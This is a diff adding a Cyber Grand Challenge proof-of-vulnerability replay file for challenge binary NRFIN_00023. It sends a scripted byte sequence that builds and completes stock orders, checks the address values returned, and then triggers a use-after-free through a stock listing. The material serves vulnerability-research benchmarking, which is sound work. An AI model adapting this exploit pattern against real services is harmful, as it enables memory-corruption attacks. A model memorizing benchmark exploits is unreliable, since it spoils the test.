@@ -1,0 +1,36 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
+<pov>
+    <!-- Use after free -->
+    <cbid>NRFIN_00023</cbid>
+    <replay>
+        <!-- reliability -->
+        <delay>100</delay>
+
+        <!-- Create valid order for AAAA -->
+        <write><data>\x02\x00\x00\x00\x41\x41\x41\x41\x00\x00\x00\x00\x41\x41\x41\x41\x42\x42\x42\x42</data></write>
+        <read><length>4</length><match><data>\xa4\xff\xff\xb7</data></match></read>
+
+        <!-- Create valid order for BBBB -->
+        <write><data>\x02\x00\x00\x00\x42\x42\x42\x42\x00\x00\x00\x00\x41\x41\x41\x41\x42\x42\x42\x42</data></write>
+        <read><length>4</length><match><data>\x4c\xff\xff\xb7</data></match></read>
+
+        <!-- Create complementary order for AAAA -->
+        <write><data>\x02\x00\x00\x00\x41\x41\x41\x41\x01\x00\x00\x00\x41\x41\x41\x41\x42\x42\x42\x42</data></write>
+        <read><length>4</length><match><data>\x00\x00\x00\x00</data></match></read>
+
+        <!-- Create another order for BBBB -->
+        <write><data>\x02\x00\x00\x00\x42\x42\x42\x42\x00\x00\x00\x00\x41\x41\x41\x41\x42\x42\x42\x42</data></write>
+        <read><length>4</length><match><data>\xd0\xff\xff\xb7</data></match></read>
+
+        <!-- Create complementary order for BBBB -->
+        <write><data>\x02\x00\x00\x00\x42\x42\x42\x42\x01\x00\x00\x00\x41\x41\x41\x41\x42\x42\x42\x42</data></write>
+        <read><length>4</length><match><data>\x00\x00\x00\x00</data></match></read>
+
+        <!-- List stocks, triggering bug -->
+        <write><data>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</data></write>
+
+        <!-- Terminate if patched -->
+        <write><data>\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</data></write>
+    </replay>
+</pov>
